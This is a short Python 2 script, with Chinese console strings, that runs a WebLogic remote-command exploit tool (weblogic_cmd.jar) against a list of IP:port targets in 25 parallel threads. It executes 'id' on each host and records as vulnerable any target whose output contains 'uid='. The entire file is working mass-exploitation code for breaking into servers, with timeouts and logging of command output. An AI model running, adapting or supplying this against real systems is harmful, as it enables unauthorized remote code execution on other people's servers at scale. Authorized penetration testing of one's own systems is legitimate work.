# -*- coding: gb2312 -*-
import os
import threadpool
import subprocess, datetime, time, signal

targets=open('target.txt','r')
commands=[]
for line in targets.readlines():
    line=line.strip()
    i=line.index(':')
    ip=line[:i]
    port=line[i+1:]
    commands.append('java -jar weblogic_cmd.jar -H '+ip+' -P '+port+' -C id')

targets.close()

report=open('report.txt','w')
attrackinfo=open('attrackinfo.log','w')

def attack(command):
    #command=command.split(" ")
    start = datetime.datetime.now()
    execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #execute = os.popen(command)
    while execute.poll() is None:
        time.sleep(0.2)
        now = datetime.datetime.now()
        if (now - start).seconds > 17:
            print "超时，强行结束当前进程".decode('GB2312')
            os.system("taskkill /f /PID " + str(execute.pid))
            return
    info=execute.stdout.read()
    #execute.pid
    #execute.close()
    #print type(info)

    p1=command.index(' -H ')
    p2=command.index(' -P ')
    p3=command.index(' -C ')
    ip=command[p1+4:p2]
    port=command[p2+4:p3]
    if info.find('uid=') >= 0:
        report.write(ip+':'+port+'存在漏洞！\n')
        #report.write(info + '\n\n')
    print ip+':'+port
    print info.decode('GB2312')
    attrackinfo.write(ip+':'+port+'\n')
    attrackinfo.write(info + '\n\n')

pool=threadpool.ThreadPool(25)
tasks=threadpool.makeRequests(attack,commands)
for task in tasks:
    pool.putRequest(task)
pool.wait()

report.close()
attrackinfo.close()
